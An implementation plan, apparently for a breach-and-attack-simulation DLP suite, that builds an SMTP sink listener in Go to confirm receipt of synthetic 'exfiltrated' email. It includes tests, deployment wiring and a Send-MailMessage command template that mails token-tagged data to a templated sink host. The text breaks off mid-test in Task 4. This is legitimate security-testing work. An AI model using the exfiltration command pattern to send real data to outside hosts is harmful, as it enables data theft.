# SMTP Exfiltration Channel Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a fourth DLP exfiltration channel — a real SMTP listener that receives a synthetic-data email, correlates it to a run via its `Subject` header, and records a destination-side receipt — completing the same sink-verified architecture already shipped for HTTPS, DNS tunneling, and SFTP.

**Architecture:** A new isolated package `internal/smtpsink` runs a real SMTP protocol server (`github.com/emersion/go-smtp`) bound to port 587, accepting mail unconditionally (no AUTH, no recipient validation beyond a single-recipient cap) and writing one `dlp_sink_receipts` row when a message's `Subject` header exact-matches a live `dlp_sink_tokens` entry. `internal/api/dlp_sink.go` gains a fourth placeholder branch (`{{SINK_SMTP_HOST}}`/`{{SINK_SMTP_PORT}}`) reusing the existing `{{SINK_TOKEN}}` issuance. A new scenario drives `Send-MailMessage` — always present on Windows PowerShell, so unlike SFTP this channel has no client-tool-absence branch at all.

**Tech Stack:** Go, `github.com/emersion/go-smtp` (new dependency), `net/mail` (stdlib, message parsing), PostgreSQL (`dlp_sink_tokens`/`dlp_sink_receipts`, already exist), PowerShell (`Send-MailMessage`).

**Spec:** `orchestrator/docs/superpowers/specs/2026-09-01-smtp-exfiltration-channel-design.md`

## Global Constraints

- Per-message byte ceiling: **64KB** (`MaxMessageBytes` in `internal/smtpsink`, matching `sftpsink.MaxUploadBytes`).
- Port: **587** for both the container-internal bind and the host-published port (`SINK_SMTP_PORT`, default `587`) — no split, unlike SFTP's 22-vs-2222.
- No AUTH advertised or required. No TLS/STARTTLS in V1.
- Reject more than one `RCPT TO` recipient. Reject multipart/attachment content — single plain-text part only.
- Token correlation is `Subject`-only, exact match against `dlp_sink_tokens`, never falling back to scanning the body.
- Reuse the existing 32-byte/64-hex-char `{{SINK_TOKEN}}` — no new token byte-length variant.
- Never log or persist raw message content — only token, size, and SHA-256 hash (same as every prior channel).
- Verdict stays strictly two-way sink-primary (`Succeeded`/`Blocked`) — no `skip:` marker handling needed anywhere in this channel.
- Commit and push after every task — this repo builds directly on `main`, no feature branches/worktrees/PRs.

---

## Task 1: `internal/smtpsink` pure logic — message parsing and rate limiting

**Files:**
- Create: `orchestrator/internal/smtpsink/session.go`
- Create: `orchestrator/internal/smtpsink/session_test.go`

**Interfaces:**
- Produces: `const MaxMessageBytes = 64 * 1024`; `func extractSubjectAndBody(raw []byte) (subject string, body []byte, err error)`; `func isMultipart(raw []byte) bool`; `type rateLimiter struct{...}` with `func newRateLimiter(limit int, window time.Duration) *rateLimiter` and `func (rl *rateLimiter) allow(sourceIP string) bool` (identical shape to `internal/sftpsink`'s `rateLimiter`, duplicated not shared).

- [ ] **Step 1: Write the failing tests**

```go
package smtpsink

import (
	"strings"
	"testing"
)

const sampleMessage = "From: dlptest@sink.audspect.local\r\n" +
	"To: dlptest@sink.audspect.local\r\n" +
	"Subject: abcd1234ef567890abcd1234ef567890abcd1234ef567890abcd1234ef5678\r\n" +
	"Content-Type: text/plain\r\n" +
	"\r\n" +
	"abcd1234ef567890abcd1234ef567890abcd1234ef567890abcd1234ef5678\r\n" +
	"[BAS-SIM-DLP] CustomerID,PAN,Aadhaar,SWIFT,UPI,CreditCard\r\n" +
	"BAS-SIM-SINK,ABCDE1234F,123456789012,SBININBBXXX,fake.user@upi,4111111111111111\r\n"

func TestExtractSubjectAndBody_ParsesWellFormedMessage(t *testing.T) {
	subject, body, err := extractSubjectAndBody([]byte(sampleMessage))
	if err != nil {
		t.Fatalf("extractSubjectAndBody: %v", err)
	}
	want := "abcd1234ef567890abcd1234ef567890abcd1234ef567890abcd1234ef5678"
	if subject != want {
		t.Errorf("subject = %q, want %q", subject, want)
	}
	if !strings.Contains(string(body), "[BAS-SIM-DLP]") {
		t.Errorf("body does not contain the expected synthetic marker: %q", body)
	}
}

func TestExtractSubjectAndBody_MissingSubjectIsEmptyNotError(t *testing.T) {
	raw := "From: a@b.com\r\nTo: c@d.com\r\n\r\nno subject here\r\n"
	subject, _, err := extractSubjectAndBody([]byte(raw))
	if err != nil {
		t.Fatalf("extractSubjectAndBody: %v", err)
	}
	if subject != "" {
		t.Errorf("subject = %q, want empty for a message with no Subject header", subject)
	}
}

func TestExtractSubjectAndBody_RejectsMalformedMessage(t *testing.T) {
	if _, _, err := extractSubjectAndBody([]byte("not a valid message at all, no headers")); err == nil {
		t.Error("expected an error for a message with no header/body separator")
	}
}

func TestIsMultipart_DetectsMultipartContentType(t *testing.T) {
	raw := "Content-Type: multipart/mixed; boundary=xyz\r\n\r\nbody\r\n"
	if !isMultipart([]byte(raw)) {
		t.Error("expected a multipart/mixed Content-Type to be detected")
	}
}

func TestIsMultipart_PlainTextIsNotMultipart(t *testing.T) {
	if isMultipart([]byte(sampleMessage)) {
		t.Error("a plain text/plain message must not be flagged as multipart")
	}
}

func TestRateLimiter_AllowsUpToLimitPerWindow(t *testing.T) {
	rl := newRateLimiter(3, time.Minute)
	for i := 0; i < 3; i++ {
		if !rl.allow("10.0.0.1") {
			t.Fatalf("request %d should be allowed within the limit", i)
		}
	}
	if rl.allow("10.0.0.1") {
		t.Error("4th request in the same window should be rejected")
	}
}

func TestRateLimiter_TracksSourcesIndependently(t *testing.T) {
	rl := newRateLimiter(1, time.Minute)
	if !rl.allow("10.0.0.1") {
		t.Fatal("first request from 10.0.0.1 should be allowed")
	}
	if !rl.allow("10.0.0.2") {
		t.Error("a different source IP must have its own independent limit")
	}
}
```

Add `"time"` to the test file's imports (needed by the rate limiter tests above).

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/smtpsink/... -run . -v 2>&1 | head -40`
Expected: FAIL — package `smtpsink` does not exist yet (`no such file or directory` / build failure).

- [ ] **Step 3: Write the implementation**

```go
// Package smtpsink implements a purpose-built SMTP exfiltration sink for
// the DLP validation suite -- a minimal, unauthenticated SMTP listener
// that accepts a single plain-text message per transaction and records a
// destination-side receipt when the message's Subject header exact-matches
// a live dlp_sink_tokens entry. See
// docs/superpowers/specs/2026-09-01-smtp-exfiltration-channel-design.md.
package smtpsink

import (
	"bytes"
	"fmt"
	"mime"
	"net/mail"
	"strings"
	"sync"
	"time"
)

// MaxMessageBytes bounds the total bytes this listener will buffer for a
// single message DATA stream. The synthetic [BAS-SIM-DLP] record plus its
// duplicated Subject token is well under 1KB; this is a generous but firm
// ceiling that rejects anything abusive before it can grow an unbounded
// in-memory buffer -- matches sftpsink.MaxUploadBytes exactly, for
// consistency across channels.
const MaxMessageBytes = 64 * 1024

// extractSubjectAndBody parses a raw RFC 5322 message (headers + body, as
// delivered by an SMTP DATA command) and returns its Subject header (empty
// string, not an error, if absent -- an unmatched Subject is a normal,
// expected case handled by the caller, not a parse failure) and its raw
// body bytes. Returns an error only when the message itself is malformed
// (no header/body separator, or an otherwise unparseable structure).
func extractSubjectAndBody(raw []byte) (subject string, body []byte, err error) {
	msg, err := mail.ReadMessage(bytes.NewReader(raw))
	if err != nil {
		return "", nil, fmt.Errorf("parse message: %w", err)
	}
	subject = strings.TrimSpace(msg.Header.Get("Subject"))
	buf := new(bytes.Buffer)
	if _, err := buf.ReadFrom(msg.Body); err != nil {
		return "", nil, fmt.Errorf("read message body: %w", err)
	}
	return subject, buf.Bytes(), nil
}

// isMultipart reports whether raw's Content-Type header names a multipart
// media type. This listener has no legitimate use for attachment-bearing
// mail -- a single plain-text part is the only shape it needs to
// understand -- so any multipart message is rejected outright by the
// caller before the token-correlation logic ever runs.
func isMultipart(raw []byte) bool {
	msg, err := mail.ReadMessage(bytes.NewReader(raw))
	if err != nil {
		return false
	}
	ct := msg.Header.Get("Content-Type")
	if ct == "" {
		return false
	}
	mediaType, _, err := mime.ParseMediaType(ct)
	if err != nil {
		return false
	}
	return strings.HasPrefix(mediaType, "multipart/")
}

// rateLimiter is a coarse, fixed-window per-source-IP abuse guard --
// identical in shape to internal/sftpsink's own rateLimiter, duplicated
// here rather than shared because that type is unexported in sftpsink and
// this listener has no other reason to import that package.
type rateLimiter struct {
	mu     sync.Mutex
	limit  int
	window time.Duration
	counts map[string]*windowCount
}

type windowCount struct {
	count      int
	windowEnds time.Time
}

func newRateLimiter(limit int, window time.Duration) *rateLimiter {
	return &rateLimiter{limit: limit, window: window, counts: map[string]*windowCount{}}
}

// allow reports whether sourceIP may open another connection in the
// current window, incrementing its count as a side effect.
func (rl *rateLimiter) allow(sourceIP string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	wc, ok := rl.counts[sourceIP]
	if !ok || now.After(wc.windowEnds) {
		rl.counts[sourceIP] = &windowCount{count: 1, windowEnds: now.Add(rl.window)}
		return true
	}
	wc.count++
	return wc.count <= rl.limit
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/smtpsink/... -v`
Expected: PASS for all 7 tests above.

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/smtpsink/session.go internal/smtpsink/session_test.go
git add internal/smtpsink/session.go internal/smtpsink/session_test.go
git commit -m "feat(smtpsink): add message parsing and rate limiting for the SMTP DLP sink"
git push
```

---

## Task 2: `internal/smtpsink` SMTP listener and receipt persistence

**Files:**
- Modify: `orchestrator/go.mod`, `orchestrator/go.sum` (add `github.com/emersion/go-smtp`)
- Create: `orchestrator/internal/smtpsink/listener.go`
- Create: `orchestrator/internal/smtpsink/listener_test.go`

**Interfaces:**
- Consumes: `MaxMessageBytes`, `extractSubjectAndBody`, `isMultipart`, `rateLimiter`/`newRateLimiter` (Task 1).
- Produces: `type Status struct{ State, Reason, Bind string }`; `type Listener struct{...}` with `func NewListener(addr string, db *pgxpool.Pool) (*Listener, error)`, `func (l *Listener) LocalAddr() net.Addr`, `func (l *Listener) Close() error`, `func (l *Listener) Serve(ctx context.Context)`, `func (l *Listener) Status() Status`; `func StartListener(ctx context.Context, addr string, db *pgxpool.Pool) *Listener` — identical signatures to `internal/sftpsink`'s equivalents, so `cmd/server/main.go` wiring (Task 3) is a drop-in mirror.

- [ ] **Step 1: Add the dependency and confirm its real API**

```bash
cd orchestrator
go get github.com/emersion/go-smtp@latest
go doc github.com/emersion/go-smtp Backend
go doc github.com/emersion/go-smtp Session
go doc github.com/emersion/go-smtp Server
```

Read the printed output before writing Step 3 below. The code in this
task is written against `go-smtp`'s well-established, stable API shape —
`Backend.NewSession(c *smtp.Conn) (smtp.Session, error)`; `Session.Mail(from
string, opts *smtp.MailOptions) error`; `Session.Rcpt(to string, opts
*smtp.RcptOptions) error`; `Session.Data(r io.Reader) error`;
`Session.Reset()`; `Session.Logout() error`; a `Server` constructed via
`smtp.NewServer(be)` with configurable `Domain`, `ReadTimeout`,
`WriteTimeout`, `MaxMessageBytes`, `MaxRecipients` fields and a `Serve(l
net.Listener) error` method mirroring `net/http.Server.Serve`. **If the
version `go get` resolves has different field or method names than what
Step 3 uses, adjust Step 3's code to match the real API before proceeding**
— do not paper over a compile error by guessing; `go doc`'s output is
authoritative.

- [ ] **Step 2: Write the failing tests**

```go
package smtpsink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"net/smtp"
	"os"
	"testing"
	"time"

	"github.com/audspect/bas/internal/testutil"
	"github.com/jackc/pgx/v5/pgxpool"
)

var sharedDB *testutil.TestDB

func TestMain(m *testing.M) {
	flag.Parse()
	if testing.Short() {
		os.Exit(m.Run())
	}
	sharedDB = testutil.MustSharedTestDB()
	code := m.Run()
	sharedDB.Cleanup()
	os.Exit(code)
}

func TestNewListener_BindsEphemeralPortAndReportsRunning(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		st := l.Status()
		if st.State != "running" {
			t.Errorf("State = %q, want running", st.State)
		}
		if st.Bind == "" {
			t.Error("Bind should report the actual bound address")
		}
	})
}

// sendMail issues a real SMTP transaction against addr using the stdlib
// client (net/smtp is client-only, sufficient for these tests -- no
// AUTH, matching the listener's own unauthenticated posture).
func sendMail(t *testing.T, addr, subject string, body []byte) error {
	t.Helper()
	msg := []byte("From: dlptest@sink.audspect.local\r\n" +
		"To: dlptest@sink.audspect.local\r\n" +
		"Subject: " + subject + "\r\n" +
		"Content-Type: text/plain\r\n" +
		"\r\n" +
		string(body))
	return smtp.SendMail(addr, nil, "dlptest@sink.audspect.local",
		[]string{"dlptest@sink.audspect.local"}, msg)
}

func TestListener_MatchedSubjectRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718"
		if _, err := pool.Exec(context.Background(),
			`INSERT INTO dlp_sink_tokens (token, run_id, technique_id, expires_at) VALUES ($1, $2, $3, $4)`,
			token, "run-smtp-listener-1", "T1048.003", time.Now().Add(10*time.Minute),
		); err != nil {
			t.Fatalf("seed dlp_sink_tokens: %v", err)
		}

		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		body := []byte(token + "\r\n[BAS-SIM-DLP] listener integration test payload\r\n")
		if err := sendMail(t, l.LocalAddr().String(), token, body); err != nil {
			t.Fatalf("sendMail: %v", err)
		}

		var payloadHash string
		var payloadSize int
		var channel string
		deadline := time.Now().Add(5 * time.Second)
		for {
			err := pool.QueryRow(context.Background(),
				`SELECT payload_hash, payload_size, channel FROM dlp_sink_receipts WHERE token = $1`,
				token,
			).Scan(&payloadHash, &payloadSize, &channel)
			if err == nil {
				break
			}
			if time.Now().After(deadline) {
				t.Fatalf("no dlp_sink_receipts row for token within 5s: %v", err)
			}
			time.Sleep(50 * time.Millisecond)
		}
		wantSum := sha256.Sum256(body)
		if payloadHash != hex.EncodeToString(wantSum[:]) {
			t.Errorf("payload_hash mismatch")
		}
		if payloadSize != len(body) {
			t.Errorf("payload_size = %d, want %d", payloadSize, len(body))
		}
		if channel != "smtp" {
			t.Errorf("channel = %q, want smtp", channel)
		}
	})
}

func TestListener_UnmatchedSubjectStillAccepted(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		// A never-issued token as the Subject -- the transaction must
		// still complete cleanly (250 OK, no SendMail error) and must
		// simply never write a receipt row.
		err = sendMail(t, l.LocalAddr().String(), "never-issued-token-value", []byte("unrelated body"))
		if err != nil {
			t.Fatalf("sendMail with an unmatched Subject should still succeed: %v", err)
		}
	})
}

func TestListener_OversizedMessageRejected(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		tooBig := make([]byte, MaxMessageBytes+1024)
		for i := range tooBig {
			tooBig[i] = 'x'
		}
		if err := sendMail(t, l.LocalAddr().String(), "oversized-test", tooBig); err == nil {
			t.Error("a message exceeding MaxMessageBytes should be rejected by the server")
		}
	})
}

func TestListener_SecondRecipientRejected(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener("127.0.0.1:0", pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		msg := []byte("From: dlptest@sink.audspect.local\r\nTo: a@b.com\r\nSubject: x\r\n\r\nbody\r\n")
		err = smtp.SendMail(l.LocalAddr().String(), nil, "dlptest@sink.audspect.local",
			[]string{"dlptest@sink.audspect.local", "second@sink.audspect.local"}, msg)
		if err == nil {
			t.Error("a message with more than one RCPT TO recipient should be rejected")
		}
	})
}
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/smtpsink/... -run . -v 2>&1 | head -40`
Expected: FAIL — `NewListener`/`Status`/`StartListener` undefined.

- [ ] **Step 4: Write the implementation**

```go
package smtpsink

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"sync/atomic"
	"time"

	smtp "github.com/emersion/go-smtp"
	"github.com/jackc/pgx/v5/pgxpool"
)

// idleSessionTimeout bounds how long a connected-but-idle SMTP session may
// sit open, and doubles as the read/write timeout for an active one.
// Matches the 10-minute sinkTokenTTL used elsewhere in the DLP sink
// architecture (internal/api/dlp_sink.go), the same shared ceiling
// internal/sftpsink uses for its own idle-session timeout.
const idleSessionTimeout = 10 * time.Minute

// rateLimitPerSecond is a coarse per-source-IP abuse guard, matching
// internal/sftpsink's and internal/dnssink's identical rationale: this
// listener only ever expects traffic from BAS agents running a scenario
// step.
const rateLimitPerSecond = 5

// Status reports a Listener's current health.
type Status struct {
	State  string // "running" | "failed"
	Reason string // populated when State == "failed"
	Bind   string // the actual bound address, e.g. "0.0.0.0:587"; empty when failed
}

// Listener owns a TCP socket and the go-smtp server bound to it. No AUTH
// is ever advertised or checked -- the Subject-header token is what
// correlates a message to a run, exactly like SFTP's per-upload filename
// token and the HTTP sink's per-attempt token, not conventional auth.
type Listener struct {
	ln      net.Listener
	srv     *smtp.Server
	status  atomic.Value
}

func (l *Listener) setStatus(s Status) { l.status.Store(s) }

// Status is safe to call concurrently with Serve.
func (l *Listener) Status() Status {
	v := l.status.Load()
	if v == nil {
		return Status{State: "unknown"}
	}
	return v.(Status)
}

// NewListener binds addr (e.g. ":587" in production, "127.0.0.1:0" in
// tests to get an OS-assigned ephemeral port -- read back via
// LocalAddr()) and prepares (but does not yet accept on) the SMTP server.
// db is used to persist receipts for matched tokens.
func NewListener(addr string, db *pgxpool.Pool) (*Listener, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("bind %s: %w", addr, err)
	}
	be := &backend{db: db, limiter: newRateLimiter(rateLimitPerSecond, time.Second)}
	srv := smtp.NewServer(be)
	srv.Domain = "sink.audspect.local"
	srv.ReadTimeout = idleSessionTimeout
	srv.WriteTimeout = idleSessionTimeout
	srv.MaxMessageBytes = MaxMessageBytes
	srv.MaxRecipients = 1
	srv.AllowInsecureAuth = false

	l := &Listener{ln: ln, srv: srv}
	l.setStatus(Status{State: "running", Bind: ln.Addr().String()})
	return l, nil
}

// LocalAddr returns the actual bound address. Only valid when Status()
// reports "running".
func (l *Listener) LocalAddr() net.Addr { return l.ln.Addr() }

// Close releases the TCP listener. Only valid when Status() reports
// "running".
func (l *Listener) Close() error { return l.ln.Close() }

// Serve accepts connections until ctx is cancelled or Close is called.
// Meant to be run in its own goroutine by the caller, matching
// internal/sftpsink.Listener.Serve's identical shape.
func (l *Listener) Serve(ctx context.Context) {
	go func() {
		<-ctx.Done()
		_ = l.ln.Close()
	}()
	_ = l.srv.Serve(l.ln)
}

// StartListener binds addr and runs Serve in the background, returning
// immediately. If the bind fails, it logs the failure loudly and returns
// a Listener whose Status() reports "failed" with the reason -- matching
// internal/sftpsink.StartListener's identical pattern. Never silently
// falls back to a different port.
func StartListener(ctx context.Context, addr string, db *pgxpool.Pool) *Listener {
	l, err := NewListener(addr, db)
	if err != nil {
		log.Printf("[smtpsink] FAILED to bind %s: %v -- the SMTP exfiltration channel will not be verifiable until this is resolved", addr, err)
		failed := &Listener{}
		failed.setStatus(Status{State: "failed", Reason: err.Error()})
		return failed
	}
	log.Printf("[smtpsink] listening on %s", l.LocalAddr())
	go l.Serve(ctx)
	return l
}

// backend implements smtp.Backend -- one session per accepted connection.
type backend struct {
	db      *pgxpool.Pool
	limiter *rateLimiter
}

func (be *backend) NewSession(c *smtp.Conn) (smtp.Session, error) {
	host, _, err := net.SplitHostPort(c.Conn().RemoteAddr().String())
	if err != nil {
		host = c.Conn().RemoteAddr().String()
	}
	if !be.limiter.allow(host) {
		return nil, fmt.Errorf("rate limit exceeded")
	}
	return &session{db: be.db, sourceIP: host}, nil
}

// session implements smtp.Session for exactly one SMTP transaction. It
// accepts Mail/Rcpt unconditionally (beyond the single-recipient cap
// enforced explicitly here as defense-in-depth alongside the server's own
// MaxRecipients=1), then in Data reads a bounded amount, rejects
// multipart content, and writes a receipt only when the Subject exactly
// matches a live dlp_sink_tokens row.
type session struct {
	db        *pgxpool.Pool
	sourceIP  string
	rcptCount int
}

func (s *session) Mail(from string, opts *smtp.MailOptions) error { return nil }

func (s *session) Rcpt(to string, opts *smtp.RcptOptions) error {
	s.rcptCount++
	if s.rcptCount > 1 {
		return fmt.Errorf("this listener accepts exactly one recipient per message")
	}
	return nil
}

func (s *session) Data(r io.Reader) error {
	limited := io.LimitReader(r, MaxMessageBytes+1)
	raw, err := io.ReadAll(limited)
	if err != nil {
		return fmt.Errorf("read message: %w", err)
	}
	if len(raw) > MaxMessageBytes {
		return fmt.Errorf("message exceeds the %d-byte limit", MaxMessageBytes)
	}
	if isMultipart(raw) {
		return fmt.Errorf("multipart/attachment content is not accepted by this listener")
	}
	subject, body, err := extractSubjectAndBody(raw)
	if err != nil || subject == "" {
		return nil // malformed or subject-less mail: accept and drop, never correlated
	}

	var exists bool
	if err := s.db.QueryRow(context.Background(),
		`SELECT EXISTS(SELECT 1 FROM dlp_sink_tokens WHERE token = $1)`, subject,
	).Scan(&exists); err != nil || !exists {
		return nil // no matching token: transaction still completes cleanly
	}

	sum := sha256.Sum256(body)
	_, err = s.db.Exec(context.Background(),
		`INSERT INTO dlp_sink_receipts (token, source_ip, payload_hash, payload_size, channel)
		 VALUES ($1, $2, $3, $4, $5)`,
		subject, s.sourceIP, hex.EncodeToString(sum[:]), len(body), "smtp",
	)
	return err
}

func (s *session) Reset() { s.rcptCount = 0 }

func (s *session) Logout() error { return nil }
```

`bytes` is imported for parity with `session.go`'s helpers but unused
directly here — remove it from the import list if `go vet`/`goimports`
flags it after Step 1's `go doc` check settles the exact API shape.

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/smtpsink/... -v`
Expected: PASS for all tests (Task 1's 7 plus Task 2's 5).

- [ ] **Step 6: gofmt, tidy, and commit**

```bash
cd orchestrator
go mod tidy
gofmt -l internal/smtpsink/listener.go internal/smtpsink/listener_test.go
git add go.mod go.sum internal/smtpsink/listener.go internal/smtpsink/listener_test.go
git commit -m "feat(smtpsink): add SMTP listener with Subject-token correlation"
git push
```

---

## Task 3: Wire the listener into config, server startup, and deployment

**Files:**
- Modify: `orchestrator/config/config.go`
- Modify: `orchestrator/cmd/server/main.go`
- Modify: `packaging/compose/docker-compose.yml`
- Modify: `packaging/compose/install.sh`

**Interfaces:**
- Consumes: `smtpsink.StartListener(ctx context.Context, addr string, db *pgxpool.Pool) *smtpsink.Listener` (Task 2).

- [ ] **Step 1: Add `SMTPSinkEnabled` to config**

In `orchestrator/config/config.go`, immediately after the existing `SFTPSinkEnabled` field (around line 93):

```go
	// SMTPSinkEnabled controls the SMTP exfiltration listener
	// (internal/smtpsink). Defaults to true for the same reason
	// DNSSinkEnabled/SFTPSinkEnabled do -- a bind failure is logged and
	// reflected in the listener's own Status(), never fatal to the rest
	// of the orchestrator. Env: SMTP_SINK_ENABLED.
	SMTPSinkEnabled bool `json:"smtp_sink_enabled,omitempty"`
```

In the `Load` function's default struct literal, alongside `SFTPSinkEnabled: true,`:

```go
		SMTPSinkEnabled:  true,
```

Alongside the existing `SFTP_SINK_ENABLED` env override block:

```go
	if v := os.Getenv("SMTP_SINK_ENABLED"); v != "" {
		if b, err := strconv.ParseBool(v); err == nil {
			cfg.SMTPSinkEnabled = b
		}
	}
```

- [ ] **Step 2: Start the listener in `main.go`**

In `orchestrator/cmd/server/main.go`, add the import alongside the existing `sftpsink` import:

```go
	"github.com/audspect/bas/internal/smtpsink"
```

Immediately after the existing `if cfg.SFTPSinkEnabled { ... }` block:

```go
	if cfg.SMTPSinkEnabled {
		smtpsink.StartListener(context.Background(), ":587", pool)
	} else {
		log.Println("[smtpsink] disabled via SMTP_SINK_ENABLED=false")
	}
```

- [ ] **Step 3: Add the port to `docker-compose.yml`**

In `packaging/compose/docker-compose.yml`'s `ports:` block, alongside the existing SFTP port line:

```yaml
      # SMTP sink (internal/smtpsink): container-internal and
      # host-published are the SAME port (unlike SFTP's 22-vs-2222 split)
      # -- port 587 carries much lower collision risk than 22 or 53, since
      # a host's local MTA (if any) conventionally listens on 25, not 587.
      - "${SINK_SMTP_PORT:-587}:587/tcp"
```

In the `environment:` block, alongside the existing `SFTP_SINK_ENABLED`/`SINK_SFTP_HOST`/`SINK_SFTP_PORT` lines:

```yaml
      SMTP_SINK_ENABLED: ${SMTP_SINK_ENABLED:-true}
      SINK_SMTP_HOST:    ${SINK_SMTP_HOST:-}
      SINK_SMTP_PORT:    ${SINK_SMTP_PORT:-587}
```

- [ ] **Step 4: Add setup.conf plumbing to `install.sh`**

Alongside the existing `SINK_SFTP_PORT=""` / `SINK_SFTP_HOST=""` declarations (around line 154):

```bash
SINK_SMTP_PORT=""
SINK_SMTP_HOST=""
```

Alongside the existing `SINK_SFTP_PORT)`/`SINK_SFTP_HOST)` case arms (around line 202):

```bash
      SINK_SMTP_PORT)          SINK_SMTP_PORT="$val"          ;;
      SINK_SMTP_HOST)          SINK_SMTP_HOST="$val"          ;;
```

Alongside the existing SFTP default/validation block (around line 248) — note SMTP needs only a
default, **not** a collision-rejection check, since (per the spec) container-internal and
host-published share one value and 587 carries no equivalent to SFTP's port-22-vs-sshd collision:

```bash
  [[ -z "$SINK_SMTP_PORT" ]] && SINK_SMTP_PORT="587"
```

Alongside the existing `SINK_SFTP_PORT=${SINK_SFTP_PORT}` / `SINK_SFTP_HOST=${SINK_SFTP_HOST}` lines that render the generated `.env` (around line 1091):

```bash
SINK_SMTP_PORT=${SINK_SMTP_PORT}
SINK_SMTP_HOST=${SINK_SMTP_HOST}
```

- [ ] **Step 5: Build to verify everything compiles**

Run: `cd orchestrator && go build ./... 2>&1`
Expected: clean build, no errors.

- [ ] **Step 6: Commit**

```bash
cd orchestrator
git add config/config.go cmd/server/main.go
git -C .. add packaging/compose/docker-compose.yml packaging/compose/install.sh
git commit -m "feat(smtpsink): wire SMTP sink listener into config, startup, and deployment"
git push
```

(Run `git add`/`git commit`/`git push` from the repo root so both the `orchestrator/` and
`packaging/` paths are staged together in one commit.)

---

## Task 4: Placeholder substitution in `internal/api/dlp_sink.go`

**Files:**
- Modify: `orchestrator/internal/api/dlp_sink.go`
- Modify: `orchestrator/internal/api/dlp_sink_test.go`

**Interfaces:**
- Consumes: nothing new — reuses the existing unconditional `{{SINK_TOKEN}}` block in `issueSinkTokensAndSubstitute` (already issues/substitutes the token whenever a step's command contains it).
- Produces: `func smtpSinkHost(publicBaseURL string) string`, `func smtpSinkPort() string` — same shape as `sftpSinkHost`/`sftpSinkPort`.

- [ ] **Step 1: Write the failing tests**

Append to `orchestrator/internal/api/dlp_sink_test.go`:

```go
func TestIssueSinkTokensAndSubstitute_SMTPPlaceholders(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		h := New(pool, ws.NewHub(), scenario.NewEngine(t.TempDir()), "")
		steps := []scenario.ScenarioStep{
			{TechniqueID: "T1048.003", Command: "Send-MailMessage -Subject '{{SINK_TOKEN}}' -SmtpServer {{SINK_SMTP_HOST}} -Port {{SINK_SMTP_PORT}}"},
		}
		out, err := h.issueSinkTokensAndSubstitute(context.Background(), "run-smtp-1", "https://orchestrator.example:9443", steps)
		if err != nil {
			t.Fatalf("issueSinkTokensAndSubstitute: %v", err)
		}
		cmd := out[0].Command
		if strings.Contains(cmd, "{{SINK_TOKEN}}") || strings.Contains(cmd, "{{SINK_SMTP_HOST}}") || strings.Contains(cmd, "{{SINK_SMTP_PORT}}") {
			t.Fatalf("SMTP placeholders not fully substituted: %s", cmd)
		}
		if !strings.Contains(cmd, "orchestrator.example") {
			t.Fatalf("expected the bare host in the command: %s", cmd)
		}
		if strings.Contains(cmd, "orchestrator.example:9443") {
			t.Fatalf("SINK_SMTP_HOST must not include the port: %s", cmd)
		}
		if !strings.Contains(cmd, "587") {
			t.Fatalf("expected the default SINK_SMTP_PORT (587) in the command: %s", cmd)
		}

		var tokenLen int
		if err := pool.QueryRow(context.Background(),
			`SELECT length(token) FROM dlp_sink_tokens WHERE run_id = 'run-smtp-1' AND technique_id = 'T1048.003'`,
		).Scan(&tokenLen); err != nil {
			t.Fatalf("query dlp_sink_tokens: %v", err)
		}
		if tokenLen != 64 {
			t.Fatalf("token length = %d, want 64 (SMTP reuses the existing 32-byte/64-hex-char token, not a new byte-length variant)", tokenLen)
		}
	})
}

func TestIssueSinkTokensAndSubstitute_SMTPDoesNotIssueOrphanedSecondToken(t *testing.T) {
	// Regression: the SMTP placeholder block must NOT generate its own
	// {{SINK_TOKEN}} -- guards against the same class of bug SFTP's
	// implementation had to fix mid-stream (see
